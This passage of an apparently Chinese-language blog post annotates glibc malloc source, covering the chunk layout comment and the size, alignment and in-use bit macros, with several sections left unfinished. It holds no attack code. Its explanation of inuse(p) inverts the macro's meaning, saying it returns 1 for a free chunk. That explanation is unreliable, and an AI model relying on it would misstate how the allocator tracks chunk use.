large bin 的前驱节点</p><p>bk_nextsize：记录 large bin 的后继节点</p><h3 id="malloc-chunk-的细节"><a href="#malloc-chunk-的细节" class="headerlink" title="malloc_chunk 的细节"></a>malloc_chunk 的细节</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   malloc_chunk details:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    (The following includes lightly edited explanations by Colin Plumb.)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks of memory are maintained using a `boundary tag&#x27; method as</span></span><br><span class="line"><span class="comment">    described in e.g., Knuth or Standish.  (See the paper by Paul</span></span><br><span class="line"><span class="comment">    Wilson ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a</span></span><br><span class="line"><span class="comment">    survey of such techniques.)  Sizes of free chunks are stored both</span></span><br><span class="line"><span class="comment">    in the front of each chunk and at the end.  This makes</span></span><br><span class="line"><span class="comment">    consolidating fragmented chunks into bigger chunks very fast.  The</span></span><br><span class="line"><span class="comment">    size fields also hold bits representing whether chunks are free or</span></span><br><span class="line"><span class="comment">    in use.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    An allocated chunk looks like this:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Size of previous chunk, if allocated            | |</span></span><br><span class="line"><span class="comment">       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Size of chunk, in bytes                       |M|P|</span></span><br><span class="line"><span class="comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             User data starts here...                          .</span></span><br><span class="line"><span class="comment">       .                                                               .</span></span><br><span class="line"><span class="comment">       .             (malloc_usable_size() bytes)                      .</span></span><br><span class="line"><span class="comment">       .                                                               |</span></span><br><span class="line"><span class="comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Size of chunk                                     |</span></span><br><span class="line"><span class="comment">       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Where &quot;chunk&quot; is the front of the chunk for the purpose of most of</span></span><br><span class="line"><span class="comment">    the malloc code, but &quot;mem&quot; is the pointer that is returned to the</span></span><br><span class="line"><span class="comment">    user.  &quot;Nextchunk&quot; is the beginning of the next contiguous chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks always begin on even word boundaries, so the mem portion</span></span><br><span class="line"><span class="comment">    (which is returned to the user) is also on an even word boundary, and</span></span><br><span class="line"><span class="comment">    thus at least double-word aligned.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Free chunks are stored in circular doubly-linked lists, and look like this:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Size of previous chunk                            |</span></span><br><span class="line"><span class="comment">       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    `head:&#x27; |             Size of chunk, in bytes                         |P|</span></span><br><span class="line"><span class="comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Forward pointer to next chunk in list             |</span></span><br><span class="line"><span class="comment">       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Back pointer to previous chunk in list            |</span></span><br><span class="line"><span class="comment">       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">       |             Unused space (may be 0 bytes long)                .</span></span><br><span class="line"><span class="comment">       .                                                               .</span></span><br><span class="line"><span class="comment">       .                                                               |</span></span><br><span class="line"><span class="comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    `foot:&#x27; |             Size of chunk, in bytes                           |</span></span><br><span class="line"><span class="comment">       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The P (PREV_INUSE) bit, stored in the unused low-order bit of the</span></span><br><span class="line"><span class="comment">    chunk size (which is always a multiple of two words), is an in-use</span></span><br><span class="line"><span class="comment">    bit for the *previous* chunk.  If that bit is *clear*, then the</span></span><br><span class="line"><span class="comment">    word before the current chunk size contains the previous chunk</span></span><br><span class="line"><span class="comment">    size, and can be used to find the front of the previous chunk.</span></span><br><span class="line"><span class="comment">    The very first chunk allocated always has this bit set,</span></span><br><span class="line"><span class="comment">    preventing access to non-existent (or non-owned) memory. If</span></span><br><span class="line"><span class="comment">    prev_inuse is set for any given chunk, then you CANNOT determine</span></span><br><span class="line"><span class="comment">    the size of the previous chunk, and might even get a memory</span></span><br><span class="line"><span class="comment">    addressing fault when trying to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Note that the `foot&#x27; of the current chunk is actually represented</span></span><br><span class="line"><span class="comment">    as the prev_size of the NEXT chunk. This makes it easier to</span></span><br><span class="line"><span class="comment">    deal with alignments etc but can be very confusing when trying</span></span><br><span class="line"><span class="comment">    to extend or adapt this code.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The two exceptions to all this are</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     1. The special chunk `top&#x27; doesn&#x27;t bother using the</span></span><br><span class="line"><span class="comment">   trailing size field since there is no next contiguous chunk</span></span><br><span class="line"><span class="comment">   that would have to index off it. After initialization, `top&#x27;</span></span><br><span class="line"><span class="comment">   is forced to always exist.  If it would become less than</span></span><br><span class="line"><span class="comment">   MINSIZE bytes long, it is replenished.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     2. Chunks allocated via mmap, which have the second-lowest-order</span></span><br><span class="line"><span class="comment">   bit M (IS_MMAPPED) set in their size fields.  Because they are</span></span><br><span class="line"><span class="comment">   allocated one-by-one, each must contain its own trailing size field.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="Size-and-alignment-checks-and-conversions"><a href="#Size-and-alignment-checks-and-conversions" class="headerlink" title="Size and alignment checks and conversions"></a>Size and alignment checks and conversions</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* conversion from malloc headers to user pointers, and back */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br></pre></td></tr></table></figure><p>该宏的作用是找到堆块 p 内用来存储 fd 指针的地址</p><p>说白了 <code>p</code> 就是用来存储当前堆块 <code>prev_size</code> 的地址，但是我们要的不是存储当前堆块 <code>prev_size</code> 和 <code>size</code> 的地址</p><p>用户输入的内容都是存储到<strong>那个存储 fd 指针的地址</strong>，也就是存储 size 的地址的下一个地址</p><p>fd 和 bk 都是在堆块空闲的时候才会存储在这个地址上，当堆块正在别使用的时候就是正常的存储区域</p><h3 id="mem2chunk-mem-宏"><a href="#mem2chunk-mem-宏" class="headerlink" title="mem2chunk(mem) 宏"></a>mem2chunk(mem) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span></span><br></pre></td></tr></table></figure><p>该宏的作用和 <strong>chunk2mem 宏</strong>是反过来的</p><p>由堆块内用于给用户输入的存储区地址找到堆块的起始地址，也就是用于存储当前堆块 prev_size 的地址</p><h3 id="MIN-CHUNK-SIZE-宏"><a href="#MIN-CHUNK-SIZE-宏" class="headerlink" title="MIN_CHUNK_SIZE 宏"></a>MIN_CHUNK_SIZE 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br></pre></td></tr></table></figure><p>首先要了解 <strong>offsetof 宏</strong>的定义</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> offsetof(type,ident) ((size_t)&amp;(((type*)0)-&gt;ident))</span></span><br></pre></td></tr></table></figure><p>该宏通过一个结构体中的元素来获取该结构体的其实地址到该元素之间的距离</p><p>该宏的作用是规定一整个 chunk 的最小值是多少，包括 prev_size 域和 size 域</p><p>由此可以知道，在 32 位系统下，MIN_CHUNK_SIZE 的值大小是 0x10字节</p><p>在 64 位系统下，MIN_CHUNK_SIZE 的值大小是 0x20字节</p><h3 id="MINSIZE-宏"><a href="#MINSIZE-宏" class="headerlink" title="MINSIZE 宏"></a>MINSIZE 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE  \</span></span><br><span class="line">  (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br></pre></td></tr></table></figure><p>该宏用来规定最小的堆块的可用空间，也就是说申请的堆块至少有 MINSIZE 的大小</p><p>在 32 位下，MINSIZE 的值为0x10字节</p><p>在 64 位下，MINSIZE 的值为0x20字节</p><h3 id="aligned-OK-m-宏"><a href="#aligned-OK-m-宏" class="headerlink" title="aligned_OK(m) 宏"></a>aligned_OK(m) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Check if m has acceptable alignment */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br></pre></td></tr></table></figure><p>该宏用来判断申请到的堆块中的地址是否为对齐的地址</p><h3 id="misaligned-chunk-p-宏"><a href="#misaligned-chunk-p-宏" class="headerlink" title="misaligned_chunk(p) 宏"></a>misaligned_chunk(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> misaligned_chunk(p) \</span></span><br><span class="line">  ((<span class="keyword">uintptr_t</span>)(MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ ? (p) : chunk2mem (p)) \</span><br><span class="line">   &amp; MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure><p>如果 <code>MALLOC_ALIGNMENT == 2 * SIZE_SZ</code></p><p>即如果 <code>long double</code> 对齐所需要的字节大于 <code>2 * sizeof(size_t)</code></p><p>则返回 p 的地址，也就是堆块的起始地址；否则返回该堆块 fd 指针所在的地址</p><p>一般的架构返回 <code>chunk2mem (p)</code> 的</p><h3 id="REQUEST-OUT-OF-RANGE-req-宏（缺）"><a href="#REQUEST-OUT-OF-RANGE-req-宏（缺）" class="headerlink" title="REQUEST_OUT_OF_RANGE(req) 宏（缺）"></a>REQUEST_OUT_OF_RANGE(req) 宏（缺）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span></span><br><span class="line">  ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (req) &gt;=                         \</span><br><span class="line">   (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (INTERNAL_SIZE_T) (<span class="number">-2</span> * MINSIZE))</span><br></pre></td></tr></table></figure><p>待补充</p><h3 id="request2size-req-宏（缺）"><a href="#request2size-req-宏（缺）" class="headerlink" title="request2size(req) 宏（缺）"></a>request2size(req) 宏（缺）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure><p>待补充</p><h3 id="checked-request2size-req-sz-宏（缺）"><a href="#checked-request2size-req-sz-宏（缺）" class="headerlink" title="checked_request2size(req, sz) 宏（缺）"></a>checked_request2size(req, sz) 宏（缺）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> checked_request2size(req, sz)                             \</span></span><br><span class="line">  <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE (req)) &#123;                      \</span><br><span class="line">      __set_errno (ENOMEM);                         \</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;                               \</span><br><span class="line">    &#125;                                \</span><br><span class="line">  (sz) = request2size (req);</span><br></pre></td></tr></table></figure><p>待补充</p><h2 id="Physical-chunk-operations"><a href="#Physical-chunk-operations" class="headerlink" title="Physical chunk operations"></a>Physical chunk operations</h2><h3 id="PREV-INUSE-宏"><a href="#PREV-INUSE-宏" class="headerlink" title="PREV_INUSE 宏"></a>PREV_INUSE 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></span><br></pre></td></tr></table></figure><p>该宏的意思是当前堆块的前一个堆块处于非空闲状态，规定值为 0x1</p><h3 id="prev-inuse-p-宏"><a href="#prev-inuse-p-宏" class="headerlink" title="prev_inuse(p) 宏"></a>prev_inuse(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* extract inuse bit of previous chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;size &amp; PREV_INUSE)</span></span><br></pre></td></tr></table></figure><p>检查前一个堆块是否处于空闲状态</p><p>如果前一个堆块处于非空闲状态，则返回 0x1，否则返回 0</p><h3 id="IS-MMAPPED-宏"><a href="#IS-MMAPPED-宏" class="headerlink" title="IS_MMAPPED 宏"></a>IS_MMAPPED 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2</span></span><br></pre></td></tr></table></figure><p>该宏的意思的当前的堆块是通过 mmap() 得到的</p><h3 id="chunk-is-mmapped-p-宏"><a href="#chunk-is-mmapped-p-宏" class="headerlink" title="chunk_is_mmapped(p) 宏"></a>chunk_is_mmapped(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* check for mmap()&#x27;ed chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)</span></span><br></pre></td></tr></table></figure><p>检查当前堆块是否是通过 mmap() 得到的</p><p>如果是 mmap() 得到的，那么返回 0x2，否则返回 0</p><h3 id="NON-MAIN-ARENA-宏"><a href="#NON-MAIN-ARENA-宏" class="headerlink" title="NON_MAIN_ARENA 宏"></a>NON_MAIN_ARENA 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span></span><br><span class="line"><span class="comment">   from a non-main arena.  This is only set immediately before handing</span></span><br><span class="line"><span class="comment">   the chunk to the user, if necessary.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br></pre></td></tr></table></figure><p>该宏的意思是当前 chunk 不属于主线程</p><h3 id="chunk-non-main-arena-p-宏"><a href="#chunk-non-main-arena-p-宏" class="headerlink" title="chunk_non_main_arena(p) 宏"></a>chunk_non_main_arena(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* check for chunk from non-main arena */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></figure><p>检查当前 chunk 是否属于主线程</p><p>如果不属于主线程，那么返回 0x4，否则返回 0</p><h3 id="SIZE-BITS-宏"><a href="#SIZE-BITS-宏" class="headerlink" title="SIZE_BITS 宏"></a>SIZE_BITS 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Bits to mask off when extracting size</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span></span><br><span class="line"><span class="comment">   macros for which mmapped chunks should never be seen. This should</span></span><br><span class="line"><span class="comment">   cause helpful core dumps to occur if it is tried by accident by</span></span><br><span class="line"><span class="comment">   people extending or adapting this malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></figure><p>表面看这个宏的返回值就是 7，也就是 <code>111B</code>，作用在下面的宏中有体现</p><h3 id="chunksize-p-宏"><a href="#chunksize-p-宏" class="headerlink" title="chunksize(p) 宏"></a>chunksize(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br></pre></td></tr></table></figure><p>得到堆块 p 中的 size 位的值，因为堆块是对齐的，所以后三位没有用而且也不算大小</p><p>此处清空后三位</p><h3 id="next-chunk-p-宏"><a href="#next-chunk-p-宏" class="headerlink" title="next_chunk(p) 宏"></a>next_chunk(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))</span></span><br></pre></td></tr></table></figure><p>mchunkptr 结构体指针变量的定义：<code>typedef struct malloc_chunk* mchunkptr;</code></p><p>该宏的作用就是得到当前堆块的下一个堆块的地址</p><p>代码的意思就是用<strong>当前堆</strong> p 的地址加上<strong>当前堆</strong>大小 size ，那么得到的值就是下一个堆块的地址了</p><h3 id="prev-chunk-p-宏"><a href="#prev-chunk-p-宏" class="headerlink" title="prev_chunk(p) 宏"></a>prev_chunk(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - ((p)-&gt;prev_size)))</span></span><br></pre></td></tr></table></figure><p>该宏的作用就是得到当前堆块的前一个堆块的地址</p><p>代码的意思就是用<strong>当前堆</strong> p 的地址减去<strong>前一个堆</strong>大小 size，那么得到的值就是前一个堆块的地址</p><p>不过 pre_size 只有在前一个堆块处于空闲状态的时候才会在当前堆块中有值</p><h3 id="chunk-at-offset-p-s-宏"><a href="#chunk-at-offset-p-s-宏" class="headerlink" title="chunk_at_offset(p, s) 宏"></a>chunk_at_offset(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure><p>也是获得一个堆块的地址，不过是通过指定偏移大小的方式</p><h3 id="inuse-p-宏"><a href="#inuse-p-宏" class="headerlink" title="inuse(p) 宏"></a>inuse(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* extract p&#x27;s inuse bit */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)                           \</span></span><br><span class="line">  ((((mchunkptr) (((<span class="keyword">char</span> *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure><p>获取下一个堆块的 PREV_INUSE 位，也就是说该宏是用来判断当前堆块是否处于空闲状态的</p><p>若是处于空闲状态就返回1，否则返回 0</p><h3 id="set-inuse-p-宏"><a href="#set-inuse-p-宏" class="headerlink" title="set_inuse(p) 宏"></a>set_inuse(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* set/clear chunk as being inuse without otherwise disturbing */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse(p)                           \</span></span><br><span class="line">  ((mchunkptr) (((<span class="keyword">char</span> *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size |= PREV_INUSE</span><br></pre></td></tr></table></figure><p>这个宏的作用就是通过当前堆块的大小及地址得到下一个堆块的地址</p><p>然后将下一个堆块的 PREV_INUSE 位设置为 1</p><h3 id="clear-inuse-p-宏"><a href="#clear-inuse-p-宏" class="headerlink" title="clear_inuse(p) 宏"></a>clear_inuse(p) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_inuse(p)                          \</span></span><br><span class="line">  ((mchunkptr) (((<span class="keyword">char</span> *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size &amp;= ~(PREV_INUSE)</span><br></pre></td></tr></table></figure><p>该函数的作用是清除掉 PREV_INUSE 位，<code>~(PREV_INUSE)</code> 的值是 -2</p><h3 id="inuse-bit-at-offset-p-s-宏"><a href="#inuse-bit-at-offset-p-s-宏" class="headerlink" title="inuse_bit_at_offset(p, s) 宏"></a>inuse_bit_at_offset(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)                    \</span></span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;size &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure><p>类似于 <code>inuse(p)</code> 宏，区别是它可以自己指定偏移</p><h3 id="set-inuse-bit-at-offset-p-s-宏"><a href="#set-inuse-bit-at-offset-p-s-宏" class="headerlink" title="set_inuse_bit_at_offset(p, s) 宏"></a>set_inuse_bit_at_offset(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse_bit_at_offset(p, s)                     \</span></span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;size |= PREV_INUSE)</span><br></pre></td></tr></table></figure><p>类似于 <code>set_inuse(p)</code> 宏，区别是它可以自己指定偏移</p><h3 id="clear-inuse-bit-at-offset-p-s-宏"><a href="#clear-inuse-bit-at-offset-p-s-宏" class="headerlink" title="clear_inuse_bit_at_offset(p, s) 宏"></a>clear_inuse_bit_at_offset(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_inuse_bit_at_offset(p, s)                   \</span></span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;size &amp;= ~(PREV_INUSE))</span><br></pre></td></tr></table></figure><p>类似于 <code>clear_inuse(p)</code> 宏，区别是它可以自己指定偏移</p><h3 id="set-head-size-p-s-宏"><a href="#set-head-size-p-s-宏" class="headerlink" title="set_head_size(p, s) 宏"></a>set_head_size(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Set size at head, without disturbing its use bit */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_head_size(p, s)  ((p)-&gt;size = (((p)-&gt;size &amp; SIZE_BITS) | (s)))</span></span><br></pre></td></tr></table></figure><p>在堆块 p 的 size 位设置该堆块的大小，并且<strong>不会</strong>影响到该堆块的使用位</p><h3 id="set-head-p-s-宏"><a href="#set-head-p-s-宏" class="headerlink" title="set_head(p, s) 宏"></a>set_head(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_head(p, s)       ((p)-&gt;size = (s))</span></span><br></pre></td></tr></table></figure><p>在堆块 p 的 size 位设置该堆块的大小，该方法<strong>会</strong>影响到该堆块的使用位</p><h3 id="set-foot-p-s-宏"><a href="#set-foot-p-s-宏" class="headerlink" title="set_foot(p, s) 宏"></a>set_foot(p, s) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;prev_size = (s))</span></span><br></pre></td></tr></table></figure><p>设置下一个堆块的 prev_size 位，该宏只有在当前堆块为空闲堆块时才会使用</p><p>看样子这个宏是专门在下一个堆块的 prev_size 位设置当前堆块的大小的</p><p>而且就算是该堆块的地址被申请回来了，那么下一个堆块的 prev_size位也不会改变</p><h2 id="Internal-data-structures"><a href="#Internal-data-structures" class="headerlink" title="Internal data structures"></a>Internal data structures</h2><h3 id="mbinptr-结构体指针变量"><a href="#mbinptr-结构体指针变量" class="headerlink" title="mbinptr 结构体指针变量"></a>mbinptr 结构体指针变量</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   -------------------- Internal data structures --------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   All internal state is held in an instance of malloc_state defined</span></span><br><span class="line"><span class="comment">   below. There are no other static variables, except in two optional</span></span><br><span class="line"><span class="comment">   cases:</span></span><br><span class="line"><span class="comment"> * If USE_MALLOC_LOCK is defined, the mALLOC_MUTEx declared above.</span></span><br><span class="line"><span class="comment"> * If mmap doesn&#x27;t support MAP_ANONYMOUS, a dummy file descriptor</span></span><br><span class="line"><span class="comment">     for mmap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Beware of lots of tricks that minimize the total bookkeeping space</span></span><br><span class="line"><span class="comment">   requirements. The result is a little over 1K bytes (for 4byte</span></span><br><span class="line"><span class="comment">   pointers and size_t.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Bins</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    An array of bin headers for free chunks. Each bin is doubly</span></span><br><span class="line"><span class="comment">    linked.  The bins are approximately proportionally (log) spaced.</span></span><br><span class="line"><span class="comment">    There are a lot of these bins (128). This may look excessive, but</span></span><br><span class="line"><span class="comment">    works very well in practice.  Most bins hold sizes that are</span></span><br><span class="line"><span class="comment">    unusual as malloc request sizes, but are more usual for fragments</span></span><br><span class="line"><span class="comment">    and consolidated sets of chunks, which is what these bins hold, so</span></span><br><span class="line"><span class="comment">    they can be found quickly.  All procedures maintain the invariant</span></span><br><span class="line"><span class="comment">    that no consolidated chunk physically borders another one, so each</span></span><br><span class="line"><span class="comment">    chunk in a list is known to be preceeded and followed by either</span></span><br><span class="line"><span class="comment">    inuse chunks or the ends of memory.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks in bins are kept in size order, with ties going to the</span></span><br><span class="line"><span class="comment">    approximately least recently used chunk. Ordering isn&#x27;t 